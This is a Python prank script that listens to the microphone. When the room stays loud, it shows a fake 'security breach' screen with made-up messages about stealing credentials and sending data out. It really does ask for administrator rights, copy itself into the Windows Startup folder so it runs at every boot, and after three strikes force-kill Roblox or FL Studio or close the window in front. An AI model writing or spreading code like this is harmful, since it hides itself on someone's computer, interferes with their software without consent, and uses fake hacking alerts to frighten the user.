import sounddevice as sd
import numpy as np
import time
import random
import sys
import os
import ctypes
import platform
import shutil

# --- CONFIGURATION ---
THRESHOLD = 0.08  
DURATION_REQUIRED = 1.2
COOLDOWN = 60         
STRIKE_LIMIT = 3
SAMPLE_RATE = 16000  
CHANNELS = 1
BLOCK_SIZE = 1024     

# ANSI Colors for Terminal UI
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

MESSAGES = [
    f"{Colors.GREEN}[+]{Colors.END} Establishing Encrypted Tunnel...",
    f"{Colors.GREEN}[+]{Colors.END} Bypassing Windows Defender...",
    f"{Colors.GREEN}[+]{Colors.END} Decrypting User Credentials...",
    f"{Colors.GREEN}[+]{Colors.END} Accessing Browser Cookies...",
    f"{Colors.GREEN}[+]{Colors.END} Uploading Rootkit to Ring 0...",
    f"{Colors.GREEN}[+]{Colors.END} Initializing Remote Shell...",
    f"{Colors.GREEN}[+]{Colors.END} Dumping Local Database...",
    f"{Colors.GREEN}[+]{Colors.END} Extracting Private Keys (RSA/AES)...",
    f"{Colors.GREEN}[+]{Colors.END} Mirroring Screen Content...",
    f"{Colors.GREEN}[+]{Colors.END} Infecting LAN Devices...",
    f"{Colors.GREEN}[+]{Colors.END} Compiling Exfiltrated Data...",
    f"{Colors.GREEN}[+]{Colors.END} Cleaning System Logs...",
    f"{Colors.CYAN}[*]{Colors.END} Synchronization Complete."
]

def is_admin():
    try:
        if platform.system() == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.getuid() == 0
    except: return False

def run_as_admin():
    if platform.system() == "Windows":
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def add_to_startup():
    if platform.system() == "Windows" and getattr(sys, 'frozen', False):
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            destination = os.path.join(startup_folder, os.path.basename(sys.executable))
            if not os.path.exists(destination):
                shutil.copy2(sys.executable, destination)
        except: pass

def close_active_window():
    if platform.system() == "Windows":
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
    elif platform.system() == "Android":
        os.system("input keyevent 3")

def kill_process(process_name):
    if platform.system() == "Windows":
        check = os.popen(f'tasklist /FI "IMAGENAME eq {process_name}"').read()
        if process_name in check:
            os.system(f"taskkill /F /IM {process_name} >nul 2>&1")
            return True
    return False

def apply_penalty():
    global strikes
    strikes += 1
    
    status_bar = f"{Colors.BOLD}{Colors.RED}STRIKE {strikes}/{STRIKE_LIMIT}{Colors.END}"
    print(f"\n{status_bar.center(60)}\n")
    
    if strikes >= STRIKE_LIMIT:
        print(f"{Colors.YELLOW}[!] SYSTEM LOAD EXCEEDED. MITIGATING THREAT...{Colors.END}\n")
        time.sleep(1.5)
        if not kill_process("RobloxPlayerBeta.exe"):
            if not kill_process("FL64.exe") and not kill_process("FL.exe"):
                close_active_window()
        strikes = 0

def print_troll():
    global last_trigger
    last_trigger = time.time()
    
    if platform.system() == "Android":
        os.system("am start --user 0 -n com.termux/.TermuxActivity > /dev/null 2>&1")
    
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    
    header = f"{Colors.BOLD}{Colors.RED} !!! SECURITY BREACH DETECTED !!! {Colors.END}"
    print("\n" + "█"*50)
    print(header.center(60))
    print("█"*50 + "\n")
    
    for i in range(4):
        dots = "." * (i % 4)
        sys.stdout.write(f"\r{Colors.YELLOW}[*]{Colors.END} Initializing Kernel Hook{dots.ljust(3)}")
        sys.stdout.flush()
        time.sleep(0.5)
    print(f"\n{Colors.GREEN}[OK]{Colors.END} Exploitation successful.\n")
    time.sleep(0.5)

    random_msgs = random.sample(MESSAGES[:-1], k=6)
    sequence = random_msgs + [MESSAGES[-1]]
    
    for msg in sequence:
        for char in msg:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.02)
        print()
        time.sleep(random.uniform(0.3, 0.9))
    
    print("\n" + "─"*50)
    print(f"{Colors.BOLD}{Colors.MAGENTA} DATA EXFILTRATION SUCCESSFUL {Colors.END}".center(60))
    print("─"*50 + "\n")
    
    apply_penalty()

def callback(indata, frames, time_info, status):
    global sustained_start, last_trigger
    if status or (time.time() - last_trigger < COOLDOWN):
        return
    rms = np.sqrt(np.mean(indata**2))
    if rms > THRESHOLD:
        if sustained_start is None: sustained_start = time.time()
        elif time.time() - sustained_start >= DURATION_REQUIRED:
            print_troll()
            sustained_start = None
    else: sustained_start = None

sustained_start = None
last_trigger = 0
strikes = 0

if __name__ == "__main__":
    if platform.system() == "Windows":
        if not is_admin(): run_as_admin()
        else: add_to_startup()

    try:
        with sd.InputStream(callback=callback, channels=CHANNELS, samplerate=SAMPLE_RATE, blocksize=BLOCK_SIZE, dtype='float32'):
            while True: time.sleep(1) 
    except KeyboardInterrupt: pass
    except Exception as e:
        if not getattr(sys, 'frozen', False): print(f"Error: {e}")
